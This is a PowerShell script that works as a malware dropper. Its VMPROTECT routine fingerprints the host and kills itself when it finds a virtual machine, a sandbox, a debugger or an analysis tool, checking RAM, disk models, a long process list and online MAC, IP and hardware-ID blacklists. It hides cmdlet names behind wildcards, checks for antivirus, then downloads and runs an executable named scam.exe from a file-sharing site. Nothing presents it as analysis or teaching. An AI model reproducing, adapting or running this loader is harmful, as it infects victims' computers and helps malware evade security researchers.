Add-Type -AssemblyName System.Windows.Forms

function Check-Condition {
    param (
        [scriptblock]$condition,
        [string]$errorMessage
    )
    if (& $condition) {
        Write-Host "[!] $errorMessage" -ForegroundColor Red
        Stop-Process $pid -Force
    }
}

function Search-Mac { (gcm gwm*) win32_networkadapterconfiguration | Where-Object { $_.IpEnabled } | Select-Object -ExpandProperty macaddress -join "," }
function Search-IP { (gcm I*e-Web*t*) -Uri "https://api.ipify.org" -UseBasicParsing | Select-Object -ExpandProperty Content }
function Search-HWID { (gcm gwm*) -Class Win32_ComputerSystemProduct | Select-Object -ExpandProperty UUID }
function Search-Username { [Security.Principal.WindowsIdentity]::GetCurrent().Name.Split("\")[1] }
function Check-Internet { Test-Connection -ComputerName google.com -Count 1 -ErrorAction Stop }
function Check-DriveSize { (Get-Volume | Where-Object { $_.DriveLetter } | Measure-Object -Property Size -Sum).Sum / 1GB -ge 50 }
function Check-RAM { (&(gcm gwm*) -Class Win32_PhysicalMemory | Measure-Object -Property capacity -Sum).Sum / 1GB -ge 6 }
function Check-ProcessCount { (gps | Measure-Object).Count -ge 50 }
function Check-RecentFiles { (Get-ChildItem -Path "$ENV:APPDATA\Microsoft\Windows\Recent" -Recurse).Count -ge 20 }

function VMPROTECT {
    Check-Condition { Test-Path "$env:localappdata\Temp\JSAMSIProvider64.dll" } "JSAMSIProvider64.dll"
    Check-Condition { Check-RAM -eq $false } "RAM CHECK FAILED!"
    Check-Condition { (wmic diskdrive get model) -like "*DADY HARDDISK*" -or (wmic diskdrive get model) -like "*QEMU HARDDISK*" } "QEMU HARDDISK"
    Check-Condition { (gps | Where-Object { $_.Name.ToLower() -in @("32dbg", "64dbgx", "autoruns", "autoruns64", "autorunsc", "autorunsc64", "ciscodump", "df5serv", "die", "dumpcap", "efsdump", "etwdump", "fakenet", "fiddler", "filemon", "hookexplorer", "httpdebugger", "httpdebuggerui", "ida", "ida64", "idag", "idag64", "idaq", "idaq64", "idau", "idau64", "idaw", "immunitydebugger", "importrec", "joeboxcontrol", "joeboxserver", "ksdumperclient", "lordpe", "ollydbg", "pestudio", "petools", "portmon", "prl_cc", "prl_tools", "proc_analyzer", "processhacker", "procexp", "procexp64", "procmon", "procmon64", "qemu-ga", "qga", "regmon", "reshacker", "resourcehacker", "sandman", "sbiesvc", "scylla", "scylla_x64", "scylla_x86", "sniff_hit", "sysanalyzer", "sysinspector", "sysmon", "tcpdump", "tcpview", "tcpview64", "udpdump", "vboxcontrol", "vboxservice", "vboxtray", "vgauthservice", "vm3dservice", "vmacthlp", "vmsrvc", "vmtoolsd", "vmusrvc", "vmwaretray", "vmwareuser", "vt-windows-event-stream", "windbg", "wireshark", "x32dbg", "x64dbg", "x96dbg", "xenservice" } | Select-Object -ExpandProperty Name -ne $null } "Debugging tools/processes found"
    
    $urls = @("https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/mac_list.txt", "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/ip_list.txt", "https://raw.githubusercontent.com/6nz/virustotal-vm-blacklist/main/hwid_list.txt")
    $data = @(
        Search-Mac,
        Search-IP,
        Search-HWID
    )
    foreach ($url in $urls) {
        $blacklist = (gcm I*e-Web*t*) -Uri $url -UseBasicParsing | Select-Object -ExpandProperty Content -ErrorAction SilentlyContinue
        if ($blacklist -split "`n" | Where-Object { $data -contains $_ }) {
            Write-Host "[!] Blacklisted item detected" -ForegroundColor Red
            Stop-Process $pid -Force
        }
    }
    
    Check-Condition { Check-Internet -eq $false } "INTERNET CONNECTION CHECK FAILED!"
    Check-Condition { Check-ProcessCount -eq $false } "PROCESS COUNT CHECK FAILED!"
    Check-Condition { Check-RecentFiles -eq $false } "RECENT FILE ACTIVITY CHECK FAILED!"
    Check-Condition { Check-DriveSize -eq $false } "DRIVE SIZE CHECK FAILED!"
}

VMPROTECT


$temp = "$temp\skull.exe"; 
$av = Get-WmiObject -Namespace "root\SecurityCenter2" -Query "SELECT * FROM AntivirusProduct"; 
if (($av.Count -eq 0) -or ($av.DisplayName -eq "Windows Defender")) { 
    if (-not (Test-Path $temp)) { 
        Invoke-WebRequest "https://anonsharing.com/file/4f095b99c1c9cec6/scam.exe" -OutFile $temp 
    } 
    Start-Process $temp 
}
